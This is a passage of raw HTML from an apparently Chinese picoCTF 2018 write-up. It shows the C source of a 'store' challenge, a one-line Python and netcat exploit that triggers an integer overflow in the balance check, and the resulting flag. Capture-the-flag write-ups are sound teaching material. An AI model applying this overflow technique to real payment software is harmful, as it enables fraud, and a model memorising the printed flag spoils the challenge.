</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-67>67</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-68><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-68>68</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-69><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-69>69</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>root<span style=color:#960050;background-color:#1e0010>@</span>kali:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>#</span> curl https:<span style=color:#75715e>//2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> con;
</span></span><span style=display:flex><span>    con <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> account_balance <span style=color:#f92672>=</span> <span style=color:#ae81ff>1100</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(con <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Welcome to the Store App V1.0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;World&#39;s Most Secure Purchasing App</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[1] Check Account Balance</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[2] Buy Stuff</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[3] Exit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> menu;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74> Enter a menu selection</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fflush</span>(stdin);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>menu);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(menu <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n\n</span><span style=color:#e6db74> Balance: %d </span><span style=color:#ae81ff>\n\n\n</span><span style=color:#e6db74>&#34;</span>, account_balance);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(menu <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Current Auctions</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[1] I Can&#39;t Believe its not a Flag!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[2] Real Flag</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> auction_choice;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fflush</span>(stdin);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>auction_choice);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(auction_choice <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Imitation Flags cost 1000 each, how many would you like?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>int</span> number_flags <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>fflush</span>(stdin);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>number_flags);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span>(number_flags <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>int</span> total_cost <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                    total_cost <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span><span style=color:#f92672>*</span>number_flags;
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Your total cost is: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, total_cost);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span>(total_cost <span style=color:#f92672>&lt;=</span> account_balance){
</span></span><span style=display:flex><span>                        account_balance <span style=color:#f92672>=</span> account_balance <span style=color:#f92672>-</span> total_cost;
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Your new balance: %d</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, account_balance);
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Not enough funds</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                    }   
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(auction_choice <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;A genuine Flag costs 100000 dollars, and we only have 1 in stock</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter 1 to purchase&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>int</span> bid <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>fflush</span>(stdin);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>bid);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span>(bid <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>){                
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span>(account_balance <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100000</span>){
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;YOUR FLAG IS:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                        }                 
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Not enough funds for transaction</span><span style=color:#ae81ff>\n\n\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                    }}
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            con <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>整数溢出。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;print &#34;2\n1\n&#34;+str(((1100-100001)+2**32)/1000)+&#34;\n2\n2\n1\n3\n&#34;&#39;</span> | nc 2018shell2.picoctf.com <span style=color:#ae81ff>43581</span> | grep pico
</span></span><span style=display:flex><span><span style=color:#75715e># Enter 1 to purchaseYOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=roulette>roulette<a hidden class=anchor aria-hidden=true href=#roulette>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1>  1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-2>  2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-3>  3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-4>  4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-5>  5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-6>  6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-7>  7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-8>  8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-9>  9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-10> 10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-11> 11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-12> 12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-13> 13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-14> 14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-15> 15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-16> 16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-17> 17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-18> 18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-19> 19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-20> 20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-21> 21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-22> 22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-23> 23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-24> 24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-25> 25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-26> 26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-27> 27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-28> 28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-29> 29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-30> 30</a>
